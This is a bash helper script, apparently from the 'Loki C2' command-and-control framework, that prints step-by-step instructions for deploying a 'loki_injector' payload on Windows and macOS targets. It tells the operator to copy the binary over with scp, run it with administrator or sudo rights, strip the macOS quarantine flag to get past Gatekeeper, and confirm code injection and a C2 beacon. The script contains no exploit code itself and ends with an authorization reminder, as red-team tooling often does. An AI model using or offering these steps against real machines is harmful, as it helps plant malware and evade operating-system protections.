#!/bin/bash
# Quick deployment script for Loki payloads

echo "============================================"
echo "Loki C2 - Payload Deployment Assistant"
echo "============================================"
echo ""

PS3="Select your target platform: "
options=("Windows" "macOS" "Exit")

select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            echo ""
            echo "📦 Windows Deployment"
            echo "===================="
            echo ""
            echo "Step 1: Build the .exe"
            echo "----------------------"
            echo ""
            echo "Choose build method:"
            echo "  a) Build on Windows:"
            echo "     cd output/windows/"
            echo "     build.bat"
            echo ""
            echo "  b) Build on macOS (Docker):"
            echo "     cd output/windows/"
            echo "     chmod +x build_docker.sh"
            echo "     ./build_docker.sh"
            echo ""
            echo "Step 2: Transfer to Windows target"
            echo "-----------------------------------"
            echo "  scp output/windows/dist/loki_injector.exe user@target:C:\\Temp\\"
            echo ""
            echo "Step 3: Execute on target"
            echo "-------------------------"
            echo "  Right-click loki_injector.exe → Run as Administrator"
            echo ""
            echo "Step 4: Verify"
            echo "--------------"
            echo "  - Check for [Loki] messages in target app DevTools (F12)"
            echo "  - Verify C2 beacon received"
            echo ""
            break
            ;;
        "macOS")
            echo ""
            echo "🍎 macOS Deployment"
            echo "==================="
            echo ""
            echo "Step 1: Executable is ready!"
            echo "----------------------------"
            echo "  output/mac/loki_injector_mac (7.3 MB)"
            echo ""
            echo "Step 2: Transfer to macOS target"
            echo "---------------------------------"
            echo "  scp output/mac/loki_injector_mac user@target:/tmp/"
            echo ""
            echo "Step 3: Execute on target"
            echo "-------------------------"
            echo "  ssh user@target"
            echo "  chmod +x /tmp/loki_injector_mac"
            echo "  sudo /tmp/loki_injector_mac"
            echo ""
            echo "Step 4: Bypass Gatekeeper (if needed)"
            echo "-------------------------------------"
            echo "  xattr -d com.apple.quarantine /tmp/loki_injector_mac"
            echo ""
            echo "Step 5: Verify"
            echo "--------------"
            echo "  - Check for [Loki] messages in target app DevTools (Cmd+Opt+I)"
            echo "  - Verify C2 beacon received"
            echo ""
            break
            ;;
        "Exit")
            echo ""
            echo "Goodbye!"
            exit 0
            ;;
        *)
            echo "Invalid option. Please try again."
            ;;
    esac
done

echo ""
echo "📚 Documentation:"
echo "  - Platform READMEs: output/{windows|mac}/README.md"
echo "  - Main guide: output/README.md"
echo ""
echo "⚠️  REMINDER: Only use with proper authorization!"
echo ""
